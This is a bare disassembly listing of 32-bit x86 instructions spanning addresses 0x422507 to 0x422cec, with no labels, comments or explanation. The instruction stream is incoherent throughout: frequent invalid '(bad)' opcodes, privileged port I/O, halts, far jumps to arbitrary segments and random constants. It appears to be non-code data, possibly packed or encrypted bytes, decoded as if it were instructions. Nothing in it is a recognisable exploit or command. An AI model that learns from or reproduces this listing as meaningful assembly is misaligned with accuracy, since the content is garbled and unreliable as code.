  422507:	fs mov ah,dl
  42250a:	xor    DWORD PTR [edx],0x89cd8c90
  422510:	repnz push edi
  422512:	arpl   WORD PTR [ecx-0x7e],bx
  422515:	xchg   edx,eax
  422516:	mov    esp,0xd1ea79bc
  42251b:	push   esi
  42251c:	outs   dx,BYTE PTR ds:[esi]
  42251d:	je     0x4224d8
  42251f:	push   esp
  422520:	lds    esi,FWORD PTR [edi+0x7dbd527e]
  422526:	cdq    
  422527:	dec    esi
  422528:	out    dx,eax
  422529:	icebp  
  42252a:	jnp    0x422536
  42252c:	mov    edi,0xded01175
  422531:	jmp    0x18cb:0x3ac015ab
  422538:	mov    edi,0xd3e65c9c
  42253d:	(bad)  
  42253e:	fmul   st,st(5)
  422540:	jecxz  0x422535
  422542:	jmp    0x5bba:0x1848a84e
  422549:	lds    edx,FWORD PTR [edx]
  42254b:	jmp    0x7cdc:0xebae69a3
  422552:	addr16 loope 0x4225bc
  422555:	clc    
  422556:	jmp    0x89b3:0xae0d23ea
  42255d:	inc    ecx
  42255e:	dec    eax
  42255f:	push   ebx
  422560:	add    DWORD PTR [ebx],eax
  422562:	popa   
  422563:	popa   
  422564:	outs   dx,BYTE PTR ds:[esi]
  422565:	dec    edx
  422566:	data16 out dx,al
  422568:	mov    ecx,0x11c607e2
  42256d:	sahf   
  42256e:	dec    edi
  42256f:	push   ebx
  422570:	imul   edx,DWORD PTR [ecx+0x69],0x2f6fb10
  422577:	jg     0x42251a
  422579:	outs   dx,DWORD PTR ds:[esi]
  42257a:	mov    ds:0x2be6363c,eax
  42257f:	pusha  
  422580:	lds    ebp,FWORD PTR [ecx]
  422582:	hlt    
  422583:	aad    0x83
  422585:	sub    eax,0x959f821f
  42258a:	(bad)
  42258d:	test   al,0xdf
  42258f:	sbb    bh,cl
  422591:	je     0x422609
  422593:	in     al,0xb9
  422595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422596:	jns    0x4225dd
  422598:	jae    0x4225fb
  42259a:	leave  
  42259b:	xor    DWORD PTR [ebx-0x6e],ebx
  42259e:	jmp    0x8f015a2a
  4225a3:	jge    0x4225f5
  4225a5:	mov    ebx,0x3a206abc
  4225aa:	sub    ebp,esi
  4225ac:	xchg   ebp,eax
  4225ad:	mov    bl,0x5b
  4225af:	or     BYTE PTR [eax+eiz*2-0x4a],0x3a
  4225b4:	cdq    
  4225b5:	mov    ebp,0x4f609e2c
  4225ba:	sub    bh,BYTE PTR [edi]
  4225bc:	adc    eax,ecx
  4225be:	inc    edi
  4225bf:	push   esi
  4225c0:	sub    dh,BYTE PTR [esi]
  4225c2:	inc    edx
  4225c3:	fs test al,0xcf
  4225c6:	ja     0x422611
  4225c8:	xor    ebx,DWORD PTR [ecx+0x6d]
  4225cb:	imul   ebp,DWORD PTR [edx],0x45
  4225ce:	adc    DWORD PTR [esi-0x7c],ecx
  4225d1:	scas   al,BYTE PTR es:[edi]
  4225d2:	or     DWORD PTR [ebp-0x5ec300ac],eax
  4225d8:	out    dx,al
  4225d9:	inc    esi
  4225da:	icebp  
  4225db:	ss push esp
  4225dd:	mov    ecx,DWORD PTR [ebx+0x7546b18d]
  4225e3:	or     al,0xa9
  4225e5:	int    0xa9
  4225e7:	mov    esp,0x3261c8b6
  4225ec:	mov    esp,0x81308bee
  4225f1:	mov    ah,0x78
  4225f3:	mov    ch,0x97
  4225f5:	cmp    al,BYTE PTR [edx]
  4225f7:	test   BYTE PTR [ebp-0x27],dl
  4225fa:	push   esp
  4225fb:	fiadd  WORD PTR [esi+0x2c]
  4225fe:	in     al,0x40
  422600:	or     bl,bh
  422602:	pop    ds
  422603:	jmp    0xc79e:0x4ad4e06d
  42260a:	out    0x65,al
  42260c:	mov    edx,0x40853085
  422611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422612:	mov    edx,DWORD PTR [ecx]
  422614:	pusha  
  422615:	cmp    BYTE PTR [ecx-0x18],dh
  422618:	push   ss
  422619:	rcl    ah,cl
  42261b:	rcl    ebp,cl
  42261d:	aam    0x64
  42261f:	adc    al,0x19
  422621:	loope  0x422693
  422623:	jne    0x4225bc
  422625:	add    al,0xf
  422627:	out    0x14,eax
  422629:	mov    ds:0x6b910e66,eax
  42262e:	cs or  ecx,ebp
  422631:	pop    esp
  422632:	out    0xf3,eax
  422634:	adc    edx,esp
  422636:	xchg   ecx,eax
  422637:	hlt    
  422638:	lods   al,BYTE PTR ds:[esi]
  422639:	cmp    BYTE PTR [ecx+ecx*1+0x6a],dh
  42263d:	or     BYTE PTR [ecx+0x3254385f],dh
  422643:	sub    eax,0xde0fdd7d
  422648:	stos   BYTE PTR es:[edi],al
  422649:	pusha  
  42264a:	jp     0x42267b
  42264c:	(bad)  
  42264d:	rol    esi,1
  42264f:	imul   ebx,esi,0x576a7f1f
  422655:	stos   BYTE PTR es:[edi],al
  422656:	mov    ecx,0xb46e59f7
  42265b:	popa   
  42265c:	or     dh,BYTE PTR ds:0x76c80c1d
  422662:	stos   BYTE PTR es:[edi],al
  422663:	loope  0x4226ca
  422665:	(bad)  
  422666:	jecxz  0x4225ee
  422668:	ss jl  0x42268d
  42266b:	std    
  42266c:	mov    ebx,0xb9ccf8cc
  422671:	shl    esi,cl
  422673:	push   ebp
  422674:	fldcw  WORD PTR [esi-0x1c56983f]
  42267a:	sub    esp,DWORD PTR [esi+ecx*4+0x3]
  42267e:	dec    esi
  42267f:	shl    DWORD PTR cs:[ecx-0x5b78ae9b],1
  422686:	push   ecx
  422687:	out    dx,al
  422688:	sub    ah,ah
  42268a:	mov    bh,0x87
  42268c:	and    ch,dh
  42268e:	sahf   
  42268f:	dec    edx
  422690:	xlat   BYTE PTR ds:[bx]
  422692:	(bad)  [edi-0x14]
  422695:	fstp   QWORD PTR [ebp+0xfab19a0]
  42269b:	cmp    BYTE PTR [edx-0xc1eb1ec],0xcd
  4226a2:	adc    DWORD PTR [ebp+0x68],esp
  4226a5:	or     BYTE PTR [ebx+ecx*8],0xa9
  4226a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226aa:	aam    0xde
  4226ac:	sbb    eax,0x9f5888d4
  4226b1:	xchg   esi,eax
  4226b2:	(bad)  
  4226b3:	popa   
  4226b4:	lods   al,BYTE PTR ds:[esi]
  4226b5:	hlt    
  4226b6:	xor    DWORD PTR ds:0x86fc3b5c,eax
  4226bc:	int3   
  4226bd:	repnz (bad) 
  4226bf:	xor    esp,DWORD PTR [ebx+0x38]
  4226c2:	test   eax,0x1af851e2
  4226c7:	pop    esp
  4226c8:	aad    0x58
  4226ca:	clc    
  4226cb:	retf   0xeac4
  4226ce:	cbw    
  4226d0:	adc    edx,DWORD PTR [ebx+0x40609795]
  4226d6:	outs   dx,BYTE PTR ds:[esi]
  4226d7:	clc    
  4226d8:	iret   
  4226d9:	cmc    
  4226da:	adc    ch,cl
  4226dc:	lds    esi,FWORD PTR [esi-0x5d]
  4226df:	mov    ebx,0xfb322a9f
  4226e4:	inc    ebp
  4226e5:	and    DWORD PTR [eax+edx*1],edx
  4226e8:	clc    
  4226e9:	add    DWORD PTR [eax],ebp
  4226eb:	retf   
  4226ec:	dec    ecx
  4226ed:	xlat   BYTE PTR ds:[ebx]
  4226ee:	and    dl,al
  4226f0:	cli    
  4226f1:	adc    edi,DWORD PTR [ebp-0x261669d7]
  4226f7:	stos   DWORD PTR es:[edi],eax
  4226f8:	add    BYTE PTR [esi+0x2],0x31
  4226fc:	mov    WORD PTR [ebp-0x12],gs
  4226ff:	cli    
  422700:	add    al,0x90
  422702:	clc    
  422703:	inc    esi
  422704:	sbb    al,0xd1
  422706:	mov    bl,0x8c
  422708:	xor    BYTE PTR [ebp+edi*2-0x50],cl
  42270c:	int3   
  42270d:	jb     0x422694
  42270f:	jg     0x4226b7
  422711:	(bad)  
  422712:	fimul  WORD PTR ds:0x7e89761f
  422718:	pop    ebx
  422719:	fwait
  42271a:	xchg   BYTE PTR [edi],bh
  42271c:	pop    ss
  42271d:	sbb    BYTE PTR [ebp+0x5c912189],0xbd
  422724:	push   ebp
  422725:	dec    edi
  422726:	pop    ecx
  422727:	add    al,0x4d
  422729:	out    dx,eax
  42272a:	cs (bad) 
  42272c:	xlat   BYTE PTR ds:[ebx]
  42272d:	cmp    al,0x58
  42272f:	or     al,0xd4
  422731:	imul   esp,ecx,0x804ea8a1
  422737:	out    dx,eax
  422738:	ins    DWORD PTR es:[edi],dx
  422739:	mov    eax,0xf5dfeb3f
  42273e:	adc    eax,ebp
  422740:	jmp    0x4226fa
  422742:	dec    esp
  422743:	add    al,0x65
  422745:	sahf   
  422746:	popa   
  422747:	sbb    BYTE PTR [eax-0x21],ch
  42274a:	stos   DWORD PTR es:[edi],eax
  42274b:	xchg   esp,eax
  42274c:	push   esi
  42274d:	daa    
  42274e:	mov    al,0xc2
  422750:	arpl   WORD PTR [ebx-0x47],bx
  422753:	addr16 sbb al,0x37
  422756:	ss jg  0x4226d9
  422759:	push   eax
  42275a:	xchg   edx,eax
  42275b:	pop    ecx
  42275c:	repz mov edi,0x89b820d8
  422762:	adc    esp,DWORD PTR [edi+0x22da144f]
  422768:	pop    edx
  422769:	retf   
  42276a:	bound  eax,QWORD PTR [ecx-0xe]
  42276d:	sti    
  42276e:	(bad)  
  42276f:	jecxz  0x4227ba
  422771:	shr    ah,cl
  422773:	cmp    bl,0x7e
  422776:	test   DWORD PTR [edi-0xa53bc7b],esi
  42277c:	cmp    al,0x4d
  42277e:	addr16 call 0x4a17ee82
  422784:	pop    edi
  422785:	push   0xffffff8a
  422787:	inc    eax
  422788:	xchg   ebp,eax
  422789:	scas   al,BYTE PTR es:[edi]
  42278a:	test   DWORD PTR [eax-0x7e],eax
  42278d:	mov    DWORD PTR [esi],ebx
  42278f:	lods   al,BYTE PTR ds:[esi]
  422790:	mov    eax,ds:0x8359664e
  422795:	push   esi
  422796:	in     eax,0x6c
  422798:	xchg   edx,eax
  422799:	popa   
  42279a:	test   al,0x44
  42279c:	enter  0x4e7c,0x34
  4227a0:	popa   
  4227a1:	and    DWORD PTR [esi],ebx
  4227a3:	sbb    BYTE PTR [ebx],al
  4227a5:	(bad)  
  4227a6:	fild   WORD PTR [ebp-0x64997f36]
  4227ac:	lea    eax,[edx-0x42]
  4227af:	mov    ch,0xab
  4227b1:	xchg   ecx,eax
  4227b2:	and    eax,0x641dc6f8
  4227b7:	popa   
  4227b8:	push   eax
  4227b9:	cmp    BYTE PTR [eax],0xc0
  4227bc:	mov    BYTE PTR [esi],al
  4227be:	retf   
  4227bf:	pop    es
  4227c0:	xchg   edx,eax
  4227c1:	test   ch,dh
  4227c3:	pop    ds
  4227c4:	stos   DWORD PTR es:[edi],eax
  4227c5:	ds add ch,ch
  4227c8:	popa   
  4227c9:	add    BYTE PTR [ecx+0x24f47c79],dl
  4227cf:	das    
  4227d0:	jmp    0x422803
  4227d2:	shl    BYTE PTR [edx],0xde
  4227d5:	push   edx
  4227d6:	cmp    eax,0x6b704b78
  4227db:	xor    dl,BYTE PTR [edi-0x20]
  4227de:	scas   al,BYTE PTR es:[edi]
  4227df:	and    eax,0x89b93059
  4227e4:	out    dx,eax
  4227e5:	addr16 mov ds:0x53b1,eax
  4227e9:	ret    
  4227ea:	sahf   
  4227eb:	push   ebp
  4227ec:	hlt    
  4227ed:	test   cl,dl
  4227ef:	int3   
  4227f0:	push   0x963164ad
  4227f5:	(bad)  
  4227f6:	mov    esp,0x60b4a5fb
  4227fb:	ins    DWORD PTR es:[edi],dx
  4227fc:	pop    ds
  4227fd:	mov    ds:0x4faf4f41,eax
  422802:	test   al,0x7e
  422804:	mov    ebp,0xcfcd0996
  422809:	dec    ecx
  42280a:	or     BYTE PTR [esi-0x6d22d07a],dl
  422810:	cmp    bl,BYTE PTR [edx]
  422812:	sub    eax,0xc5b59ba5
  422817:	push   edx
  422818:	cwde   
  422819:	(bad)  
  42281a:	mov    eax,ds:0x801d0b65
  42281f:	(bad)  
  422820:	mov    ecx,0x39539216
  422825:	push   es
  422826:	popf   
  422827:	xchg   edi,eax
  422828:	xor    eax,0x7005d911
  42282d:	mov    edi,0xf56c877c
  422832:	or     al,BYTE PTR [ebx+0x3]
  422835:	ret    
  422836:	push   ecx
  422837:	lods   eax,DWORD PTR ds:[esi]
  422838:	imul   ebx,DWORD PTR [edx-0x4da95092],0x5c834eba
  422842:	dec    ecx
  422843:	pop    esp
  422844:	pop    eax
  422845:	xchg   al,ah
  422847:	das    
  422848:	je     0x422820
  42284a:	fisttp QWORD PTR [eax]
  42284c:	aaa    
  42284d:	xchg   DWORD PTR [edx-0x43],edi
  422850:	imul   edx,DWORD PTR [ebx+0x5bc9b940],0xfffffffa
  422857:	sbb    eax,0xace98588
  42285c:	fs push esp
  42285e:	inc    edi
  42285f:	jmp    0x553aac3a
  422864:	retf   0xacd0
  422867:	cmp    BYTE PTR [edi+0x44],bl
  42286a:	shl    DWORD PTR [eax],cl
  42286c:	in     al,dx
  42286d:	cmp    DWORD PTR [ebx+0x6],edi
  422870:	or     al,0xf
  422872:	iret   
  422873:	call   0xbe14:0xdf1ae2b3
  42287a:	stos   BYTE PTR es:[edi],al
  42287b:	es pop eax
  42287d:	push   cs
  42287e:	dec    ecx
  42287f:	dec    edx
  422880:	jp     0x4228fe
  422882:	sub    ebx,esi
  422884:	pop    es
  422885:	sbb    al,0xcd
  422887:	sub    ah,BYTE PTR [edi-0x651c22e7]
  42288d:	test   eax,0x71f9f9e7
  422892:	sysexit 
  422894:	sub    BYTE PTR [eax-0x73],cl
  422897:	ss jecxz 0x422828
  42289a:	arpl   cx,ax
  42289c:	fsubr  DWORD PTR [eax]
  42289e:	rol    DWORD PTR [ecx],cl
  4228a0:	pop    esi
  4228a1:	das    
  4228a2:	pop    ds
  4228a3:	lahf   
  4228a4:	push   esp
  4228a5:	inc    eax
  4228a6:	lahf   
  4228a7:	retf   
  4228a8:	pop    edi
  4228a9:	inc    edx
  4228aa:	pop    ecx
  4228ab:	ja     0x422915
  4228ad:	(bad)  
  4228ae:	fadd   st,st(4)
  4228b0:	sbb    eax,0x6e4ab220
  4228b5:	mov    WORD PTR [edi-0x41],fs
  4228b8:	or     al,0xc2
  4228ba:	adc    ah,BYTE PTR [edi]
  4228bc:	imul   edx,DWORD PTR [eax+edi*8+0x69],0x68719430
  4228c4:	das    
  4228c5:	or     al,0xa0
  4228c7:	xchg   ebp,eax
  4228c8:	jb     0x422930
  4228ca:	imul   ebp,DWORD PTR [edx-0x13],0x164e12ee
  4228d1:	aas    
  4228d2:	add    al,cl
  4228d4:	push   ebx
  4228d5:	ins    DWORD PTR es:[edi],dx
  4228d6:	clc    
  4228d7:	cmp    al,0xd9
  4228d9:	xor    BYTE PTR [eax-0x2c2e30bb],0x34
  4228e0:	shl    ch,0x53
  4228e3:	pop    ebx
  4228e4:	jmp    FWORD PTR [edx+ebp*8-0x30003a39]
  4228eb:	inc    ebx
  4228ec:	pushf  
  4228ed:	jp     0x422899
  4228ef:	sti    
  4228f0:	aas    
  4228f1:	loop   0x42289a
  4228f3:	xchg   edi,eax
  4228f4:	pop    edx
  4228f5:	repz jae 0x4228ce
  4228f8:	sub    eax,0x30ebc793
  4228fd:	popf   
  4228fe:	shl    BYTE PTR [edi+eax*1+0x26aade7b],0x84
  422906:	xchg   DWORD PTR [ecx+0x28],edi
  422909:	dec    ecx
  42290a:	mov    dh,0xa8
  42290c:	inc    edi
  42290d:	dec    edi
  42290e:	xchg   edi,eax
  42290f:	dec    eax
  422910:	pop    ebx
  422911:	ror    DWORD PTR [esi+eiz*4-0x21552094],cl
  422918:	and    BYTE PTR [esi-0x2f],0x1b
  42291c:	dec    esp
  42291d:	dec    eax
  42291e:	into   
  42291f:	pop    esi
  422920:	dec    ebp
  422921:	js     0x42296c
  422923:	ret    
  422924:	xchg   edi,eax
  422925:	jae    0x4228a8
  422927:	hlt    
  422928:	or     BYTE PTR [esi+0x5cd73886],0xd9
  42292f:	or     eax,0xaa1e4bac
  422934:	xchg   ebp,eax
  422935:	clc    
  422936:	xor    eax,0x80c62ce0
  42293b:	pop    ecx
  42293c:	cs dec esp
  42293e:	stos   BYTE PTR es:[edi],al
  42293f:	push   esp
  422940:	jmp    0x422967
  422942:	cdq    
  422943:	push   0x45ec7aae
  422948:	js     0x4228fb
  42294a:	fwait
  42294b:	ins    DWORD PTR es:[edi],dx
  42294c:	out    0xc2,eax
  42294e:	pop    eax
  42294f:	mov    dl,0x31
  422951:	arpl   WORD PTR es:[eax],dx
  422954:	push   edx
  422955:	rol    BYTE PTR [eax-0x8565726],cl
  42295b:	aas    
  42295c:	add    bh,bl
  42295e:	mov    dh,0x78
  422960:	(bad)  
  422961:	in     eax,0xb3
  422963:	push   ebx
  422964:	xlat   BYTE PTR ds:[ebx]
  422965:	jp     0x422939
  422967:	clc    
  422968:	fisubr WORD PTR [ebp-0x4]
  42296b:	xlat   BYTE PTR ds:[ebx]
  42296c:	push   esp
  42296d:	les    edi,FWORD PTR [edi+0x40]
  422970:	jp     0x42294c
  422972:	push   eax
  422973:	push   ebp
  422974:	gs dec ecx
  422976:	mov    ds:0x6b7968ec,al
  42297b:	push   0x31
  42297d:	pop    esp
  42297e:	mov    edi,0x87402bf6
  422984:	mov    WORD PTR [edi+esi*4+0x68],ds
  422988:	xor    edx,DWORD PTR [edx+0x1]
  42298b:	dec    eax
  42298c:	cld    
  42298d:	xchg   BYTE PTR [ebp+0x2],ch
  422990:	dec    ebx
  422991:	popa   
  422992:	stos   DWORD PTR es:[edi],eax
  422993:	(bad)  
  422994:	ds sub eax,0xb4ff1a81
  42299a:	fstp   DWORD PTR [esi+0x3e]
  42299d:	aam    0x4a
  42299f:	jno    0x422930
  4229a1:	adc    ebx,DWORD PTR [ebp+0x44]
  4229a4:	cmp    esi,DWORD PTR [eax+eiz*2+0x22]
  4229a8:	and    DWORD PTR [ebx+0x4ec74cae],eax
  4229ae:	jge    0x42293f
  4229b0:	clc    
  4229b1:	sbb    al,0x86
  4229b3:	mov    edx,0x2abad2e0
  4229b8:	lods   al,BYTE PTR ds:[esi]
  4229b9:	jmp    0xbe3b:0x31c73c88
  4229c0:	inc    edi
  4229c1:	add    eax,0x195e41f
  4229c6:	pop    edx
  4229c7:	mov    DWORD PTR [edx+0x403b96e8],edx
  4229cd:	std    
  4229ce:	pop    es
  4229cf:	test   DWORD PTR [edx],0x1fe4641f
  4229d5:	cs mov al,0xef
  4229d8:	popa   
  4229d9:	mov    bh,0x3e
  4229db:	mov    dh,0x6d
  4229dd:	or     al,0x81
  4229df:	pop    eax
  4229e0:	sbb    BYTE PTR [ebx+edx*4+0x56fd887e],cl
  4229e7:	add    DWORD PTR [edi],0xf4d6534f
  4229ed:	dec    esp
  4229ee:	into   
  4229ef:	hlt    
  4229f0:	push   eax
  4229f1:	add    ah,BYTE PTR [ecx+0x5d]
  4229f4:	sub    eax,0x691b53d9
  4229f9:	neg    BYTE PTR [eax+0x5a7a85b2]
  4229ff:	pushf  
  422a00:	rol    al,cl
  422a02:	mov    bh,0xbe
  422a04:	neg    DWORD PTR [edi-0x5]
  422a07:	fwait
  422a08:	cdq    
  422a09:	dec    BYTE PTR [ebx-0x7e]
  422a0c:	add    ah,dl
  422a0e:	mov    dh,0x74
  422a10:	pop    eax
  422a11:	mov    eax,ds:0xaec7c16c
  422a16:	mov    ch,0x6d
  422a18:	jecxz  0x422a58
  422a1a:	pop    ebp
  422a1b:	push   eax
  422a1c:	xchg   ebx,eax
  422a1d:	ds xchg edx,eax
  422a1f:	mov    eax,0xd4ef3324
  422a24:	out    dx,eax
  422a25:	out    dx,eax
  422a26:	xchg   esp,eax
  422a27:	inc    esi
  422a28:	cmp    al,0xc6
  422a2a:	cli    
  422a2b:	cli    
  422a2c:	pop    edx
  422a2d:	repz pop ss
  422a2f:	lea    ebp,[edi+ebx*2]
  422a32:	jbe    0x422a02
  422a34:	inc    edx
  422a35:	xor    DWORD PTR [esi+0x2e6c95f1],esi
  422a3b:	out    0x83,al
  422a3d:	push   edi
  422a3e:	rcr    DWORD PTR [esi],1
  422a40:	inc    eax
  422a41:	in     al,dx
  422a42:	xor    ebx,edi
  422a44:	mov    BYTE PTR [ebp-0x33],al
  422a47:	and    al,BYTE PTR [edx-0x44]
  422a4a:	rcl    DWORD PTR [ebx+0x3228ca7f],0xe
  422a51:	jbe    0xd283b17
  422a57:	mov    esp,0xc8bebee1
  422a5c:	mov    DWORD PTR [ebp-0x65],esi
  422a5f:	fldenv [esp+esi*4]
  422a62:	mov    ch,0x29
  422a64:	mov    dh,0x59
  422a66:	(bad)  
  422a67:	dec    ebp
  422a68:	jmp    0xb70e:0x1026f2ae
  422a6f:	call   0xb1635471
  422a74:	imul   esi,DWORD PTR [eax+esi*8-0x70afbac1],0xffffff8a
  422a7c:	lods   al,BYTE PTR ds:[esi]
  422a7d:	mov    eax,0x7e598ce2
  422a82:	(bad)  
  422a83:	sbb    DWORD PTR [edx+0x7c],edx
  422a86:	mov    ds:0x1b12ad50,eax
  422a8b:	jmp    0xffc4e611
  422a90:	sub    BYTE PTR [eax+0x31],al
  422a93:	push   cs
  422a94:	loope  0x422a92
  422a96:	mov    esp,0xd647d70d
  422a9b:	push   0x8fd5f3f
  422aa0:	rcl    DWORD PTR [ebp-0x4],1
  422aa3:	jb     0x422a4c
  422aa5:	mov    ecx,0x6ff2fe91
  422aaa:	push   edx
  422aab:	pop    esi
  422aac:	cmp    BYTE PTR [ebx],bl
  422aae:	shr    edi,0xf3
  422ab1:	mov    cl,0x7b
  422ab3:	jl     0x422a4d
  422ab5:	sbb    al,0x8e
  422ab7:	cli    
  422ab8:	sbb    BYTE PTR [esi+0x68],ch
  422abb:	stos   DWORD PTR es:[edi],eax
  422abc:	sahf   
  422abd:	sbb    al,0x5b
  422abf:	add    al,BYTE PTR [esi+0x6904fdbe]
  422ac5:	push   ecx
  422ac6:	popf   
  422ac7:	xor    eax,0xd9a09265
  422acc:	stos   BYTE PTR es:[edi],al
  422acd:	mov    edi,0xe623f3c2
  422ad2:	sbb    edx,0xeb962a68
  422ad8:	and    ah,BYTE PTR [ecx+esi*2+0x1c]
  422adc:	inc    esp
  422add:	mov    al,0xe3
  422adf:	sbb    edi,DWORD PTR [ebp+0x36f4e8ce]
  422ae5:	sti    
  422ae6:	jecxz  0x422aa0
  422ae8:	lock in eax,dx
  422aea:	sbb    BYTE PTR [ecx+0x9],cl
  422aed:	push   esp
  422aee:	je     0x422b6d
  422af0:	xor    eax,0x6732da46
  422af5:	sub    edi,DWORD PTR [ecx+0x64]
  422af8:	inc    esi
  422af9:	xlat   BYTE PTR ds:[ebx]
  422afa:	in     al,0xe4
  422afc:	mov    ch,0x39
  422afe:	and    bl,BYTE PTR [ebp+edi*4+0x6606f2e9]
  422b05:	out    dx,al
  422b06:	lahf   
  422b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b08:	fldenv [esi+0x47d44159]
  422b0e:	in     eax,dx
  422b0f:	push   ebx
  422b10:	pop    ebx
  422b11:	in     eax,0x85
  422b13:	test   al,0x93
  422b15:	sub    al,0xfd
  422b17:	cmp    al,bl
  422b19:	lods   eax,DWORD PTR ds:[esi]
  422b1a:	and    ah,BYTE PTR [eax-0x14251c25]
  422b20:	and    DWORD PTR [eax+ecx*8-0x284d4376],esi
  422b27:	rcl    DWORD PTR [edx-0x4274dee0],cl
  422b2d:	xor    BYTE PTR [esi],0x78
  422b30:	xor    dh,bh
  422b32:	sbb    al,0xb9
  422b34:	loopne 0x422b6d
  422b36:	pop    es
  422b37:	mov    esi,0xb1c3dfa9
  422b3c:	shr    BYTE PTR [edi],1
  422b3e:	jp     0x422b68
  422b40:	adc    DWORD PTR [esi+0xe5b635b],esi
  422b46:	and    BYTE PTR [ecx+0x6],dh
  422b49:	enter  0xb51a,0x3f
  422b4d:	jnp    0x422b86
  422b4f:	push   esp
  422b50:	inc    esi
  422b51:	popa   
  422b52:	pop    esp
  422b53:	mov    edi,ebp
  422b55:	lods   al,BYTE PTR ds:[esi]
  422b56:	cmp    BYTE PTR [ecx-0x4684ae32],cl
  422b5c:	push   esi
  422b5d:	jg     0x422af4
  422b5f:	sub    eax,0x3e028b12
  422b64:	and    esi,0xc5d8462b
  422b6a:	call   0x1f61fdfd
  422b6f:	repnz repz out dx,eax
  422b72:	outs   dx,DWORD PTR ds:[esi]
  422b73:	sub    dh,BYTE PTR [ebx+0x1fca1c00]
  422b79:	push   cs
  422b7a:	jl     0x422b04
  422b7c:	xchg   edi,eax
  422b7d:	mov    ch,0x27
  422b7f:	ret    
  422b80:	imul   eax,DWORD PTR [ebp+ecx*1-0xb],0x1c
  422b85:	arpl   WORD PTR [ebp+eax*4-0x1ed0b1d1],sp
  422b8c:	or     al,0x58
  422b8e:	loop   0x422c04
  422b90:	daa    
  422b91:	repz int 0x62
  422b94:	or     ah,BYTE PTR [edx+0x7d]
  422b97:	xchg   BYTE PTR [esi-0x16ee780a],dl
  422b9d:	enter  0x4c85,0xc2
  422ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ba2:	mov    esi,0xc0077985
  422ba7:	mov    esi,0xe0f5f51b
  422bac:	mov    ebp,0xda911482
  422bb1:	jle    0x422bf4
  422bb3:	push   esp
  422bb4:	lock xchg ecx,eax
  422bb6:	jbe    0x422c20
  422bb8:	push   edi
  422bb9:	hlt    
  422bba:	leave  
  422bbb:	push   cs
  422bbc:	mov    DWORD PTR [esi],esi
  422bbe:	xor    al,0xfc
  422bc0:	inc    ecx
  422bc1:	cmc    
  422bc2:	ret    0x18fd
  422bc5:	xor    eax,0x528e9c81
  422bca:	aad    0xe6
  422bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bcd:	call   0x65c15c0a
  422bd2:	sbb    edi,DWORD PTR [esi-0x6c]
  422bd5:	inc    esp
  422bd6:	adc    BYTE PTR ss:[eax+0x4b],0x58
  422bdb:	cmp    ch,BYTE PTR [ecx-0x645a46a0]
  422be1:	mov    WORD PTR [ecx+0x18],ds
  422be4:	mov    ch,0xae
  422be6:	jb     0x422c13
  422be8:	inc    ebp
  422be9:	push   es
  422bea:	gs pop ecx
  422bec:	sbb    edx,esi
  422bee:	ja     0x422c1e
  422bf0:	push   0x84cfa42d
  422bf5:	mov    esi,0x9780bca9
  422bfa:	ror    BYTE PTR [eax-0x3b],1
  422bfd:	ds (bad) 
  422bff:	jno    0x422bbd
  422c01:	fadd   QWORD PTR [esp+eax*2-0x66]
  422c05:	(bad)  
  422c06:	call   0xf318:0xc0efcd09
  422c0d:	xor    eax,0xc7104206
  422c12:	xor    BYTE PTR [edi],0x1a
  422c15:	xor    DWORD PTR [eax-0x7ef5e2aa],0x1aa78d88
  422c1f:	aam    0x81
  422c21:	mov    edx,0xd963f914
  422c26:	xor    BYTE PTR [esi],dh
  422c28:	push   es
  422c29:	out    0x86,al
  422c2b:	fsubr  QWORD PTR [ebx-0x5d64fde1]
  422c31:	pushf  
  422c32:	mov    edi,0xa2a245c6
  422c37:	repz or eax,0xb9650b7f
  422c3d:	xor    dl,BYTE PTR [edx-0x22]
  422c40:	and    ch,0x1e
  422c43:	pop    eax
  422c44:	mov    cl,0xd5
  422c46:	ret    
  422c47:	pop    ebp
  422c48:	mov    cl,0x25
  422c4a:	or     DWORD PTR es:[edx-0x29],esp
  422c4e:	out    0x21,eax
  422c50:	sub    al,0x4
  422c52:	int    0xf4
  422c54:	sub    DWORD PTR [esi+0x5df1b623],edi
  422c5a:	popa   
  422c5b:	lahf   
  422c5c:	or     bh,BYTE PTR [eax]
  422c5e:	mov    cl,BYTE PTR [ebp+ebp*8+0xac00d61]
  422c65:	pop    esp
  422c66:	dec    esi
  422c67:	mov    BYTE PTR [ebx+0x3a5c52c4],dh
  422c6d:	adc    DWORD PTR [ecx-0xe],eax
  422c70:	ret    0xfa92
  422c73:	sbb    eax,edi
  422c75:	xor    edi,ebx
  422c77:	jne    0x422cad
  422c79:	dec    esi
  422c7a:	mov    ebp,0x9ce9c360
  422c7f:	adc    BYTE PTR [esi-0x67],bl
  422c82:	xchg   DWORD PTR [ebp+edi*1+0x8],edi
  422c86:	cmp    ch,dl
  422c88:	jb     0x422c33
  422c8a:	int3   
  422c8b:	(bad)  
  422c8c:	jmp    0x422cb8
  422c8e:	push   ebp
  422c8f:	imul   ebx,DWORD PTR [eax-0x7cd38722],0xb7c3c808
  422c99:	inc    edi
  422c9a:	push   ds
  422c9b:	sub    al,0x8f
  422c9d:	repnz rcl DWORD PTR [ecx],cl
  422ca0:	xor    cl,BYTE PTR ds:0x3feb7317
  422ca6:	nop
  422ca7:	out    dx,eax
  422ca8:	or     al,0x49
  422caa:	icebp  
  422cab:	popa   
  422cac:	jb     0x422cdd
  422cae:	aaa    
  422caf:	in     al,0x34
  422cb1:	cmp    DWORD PTR [ecx-0x1568b750],ebp
  422cb7:	xor    eax,0xd0d9a096
  422cbc:	adc    BYTE PTR ds:0xbeaf9a2,dh
  422cc2:	shl    BYTE PTR [edx-0x4cb4c1b3],0xf1
  422cc9:	in     al,0x70
  422ccb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ccc:	jl     0x422cf1
  422cce:	or     al,BYTE PTR [eax+0x1c]
  422cd1:	xchg   esi,eax
  422cd2:	aaa    
  422cd3:	and    esp,ebx
  422cd5:	or     BYTE PTR [ecx+esi*4+0x218e67fc],0x46
  422cdd:	out    0x7,eax
  422cdf:	rol    ebx,0xbb
  422ce2:	inc    eax
  422ce3:	cmp    DWORD PTR [edx+0x3f],ecx
  422ce6:	test   DWORD PTR [eax+0x3ae41c3e],esi
  422cec:	bound  eax,QWORD PTR [ecx]
